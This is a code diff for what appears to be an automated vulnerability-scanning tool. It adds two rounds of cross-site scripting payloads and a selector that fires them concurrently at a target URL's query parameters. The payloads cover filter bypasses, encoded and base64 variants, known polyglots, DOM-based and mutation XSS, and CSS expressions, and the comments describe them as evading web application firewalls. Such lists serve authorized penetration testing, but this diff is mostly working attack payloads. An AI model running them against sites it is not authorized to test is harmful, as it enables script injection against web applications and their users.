@@ -31,14 +31,90 @@ XSS_PAYLOADS: list[dict[str, str]] = [
     # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
 ]
 
+# Round 2 — filter bypass (case mixing, whitespace tricks, alt syntaxes).
+# Most simple WAFs block `<script>` but miss these.
+XSS_PAYLOADS_ROUND2: list[dict[str, str]] = [
+    {"payload": "<ScRiPt>alert(1)</sCrIpT>", "context": "case_mix"},
+    {"payload": "<script >alert(1)</script >", "context": "whitespace"},
+    {"payload": "<script\t>alert(1)</script>", "context": "tab_split"},
+    {"payload": "<script\n>alert(1)</script>", "context": "newline_split"},
+    {"payload": "<<script>alert(1);//<</script>", "context": "double_bracket"},
+    {"payload": "<scr<script>ipt>alert(1)</script>", "context": "nested_filter_bypass"},
+    {"payload": "<img src=\"x\" onerror=\"alert&#40;1&#41;\">", "context": "entity_encoded"},
+    {"payload": "<img src=x onerror=&#97;lert(1)>", "context": "html_entity_fn"},
+    {"payload": "<IMG SRC=\"javascript:alert('XSS');\">", "context": "proto_upper"},
+    {"payload": "<img src=javascript:alert(1)>", "context": "no_quotes"},
+    {"payload": "<svg><animate onbegin=alert(1) attributeName=x>", "context": "svg_animate"},
+    {"payload": "<video><source onerror=alert(1)>", "context": "video"},
+    {"payload": "<audio src=x onerror=alert(1)>", "context": "audio"},
+    {"payload": "<keygen autofocus onfocus=alert(1)>", "context": "keygen"},
+    {"payload": "<isindex type=image src=x onerror=alert(1)>", "context": "isindex"},
+    {"payload": "<object data=\"data:text/html,<script>alert(1)</script>\">", "context": "data_url"},
+    {"payload": "<embed src=\"data:text/html,<script>alert(1)</script>\">", "context": "embed"},
+    {"payload": "<form><button formaction=javascript:alert(1)>X</button>", "context": "formaction"},
+    {"payload": "<svg><a xlink:href=\"javascript:alert(1)\"><text>click</text></a>", "context": "xlink"},
+    {"payload": "<iframe srcdoc=\"<script>alert(1)</script>\">", "context": "srcdoc"},
+]
 
-async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dict[str, Any]:
+# Round 3 — polyglots + DOM-XSS + WAF evasion via encoding.
+# Brutal last-resort payloads; some trigger in multiple contexts at once.
+XSS_PAYLOADS_ROUND3: list[dict[str, str]] = [
+    # The classic 0xsobky polyglot — fires in script, attribute, URL, and style contexts
+    {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "context": "polyglot_0xsobky"},
+    {"payload": "\"'--></style></script><svg onload=alert(1)>", "context": "polyglot_break"},
+    {"payload": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "context": "polyglot_rsnake"},
+    # DOM-XSS hooks
+    {"payload": "#<script>alert(1)</script>", "context": "dom_hash"},
+    {"payload": "#<img src=x onerror=alert(1)>", "context": "dom_hash_img"},
+    {"payload": "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>", "context": "dom_js_proto"},
+    # Base64 in data URL
+    {"payload": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "context": "data_base64"},
+    # Double-URL encoded
+    {"payload": "%253Cscript%253Ealert(1)%253C/script%253E", "context": "double_urlencoded"},
+    # Unicode-escaped
+    {"payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "context": "unicode_escaped"},
+    # HTML5-only
+    {"payload": "<x contenteditable onbeforeinput=alert(1)>x", "context": "html5_beforeinput"},
+    {"payload": "<x oncut=alert(1)>x", "context": "html5_oncut"},
+    # SVG use element + xlink to external
+    {"payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/></svg>", "context": "svg_use_ext"},
+    # Mutation-XSS
+    {"payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "context": "mxss_noscript"},
+    {"payload": "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>", "context": "mxss_listing"},
+    # CSS-based XSS (IE/legacy, but still useful for stored contexts)
+    {"payload": "<style>@import'javascript:alert(1)';</style>", "context": "css_import"},
+    {"payload": "<style>*{x:expression(alert(1))}</style>", "context": "css_expression"},
+]
+
+
+def _xss_payloads_for_round(r: int) -> list[dict[str, str]]:
+    """Select XSS payload set by rotation round.
+    1 = classic, 2 = filter bypass, 3 = polyglot/DOM/WAF evasion,
+    else = all combined (exhaustive, use sparingly).
+    """
+    if r == 1:
+        return XSS_PAYLOADS
+    if r == 2:
+        return XSS_PAYLOADS_ROUND2
+    if r == 3:
+        return XSS_PAYLOADS_ROUND3
+    return XSS_PAYLOADS + XSS_PAYLOADS_ROUND2 + XSS_PAYLOADS_ROUND3
+
+
+async def execute(url: str, param_name: str | None = None, round: int = 1,
+                  **kwargs: Any) -> dict[str, Any]:
     """Test XSS on a URL with query parameter.
 
+    `round` (1|2|3) selects the payload set — scan_loop passes
+    incrementing rounds when re-queueing the skill against the same
+    URL so the second pass tests filter-bypass payloads instead of
+    the same classic ones.
+
     Returns:
-        {"vulnerable": bool, "findings": [...], "tested": int, "url": str}
+        {"vulnerable": bool, "findings": [...], "tested": int, "url": str, "round": int}
     """
     import httpx
+    _payloads = _xss_payloads_for_round(round)
 
     parsed = urlparse(url)
     params = parse_qs(parsed.query, keep_blank_values=True)
@@ -91,7 +167,7 @@ async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dic
                     })
                     logger.info("XSS found: %s on param %s", p["context"], target_param)
 
-        await asyncio.gather(*[test_payload(p) for p in XSS_PAYLOADS])
+        await asyncio.gather(*[test_payload(p) for p in _payloads])
 
     # Deduplicate by context
     seen: set[str] = set()
@@ -102,4 +178,5 @@ async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dic
             seen.add(key)
             unique.append(f)
 
-    return {"vulnerable": len(unique) > 0, "findings": unique, "tested": tested, "url": url, "param": target_param}
+    return {"vulnerable": len(unique) > 0, "findings": unique, "tested": tested,
+            "url": url, "param": target_param, "round": round}
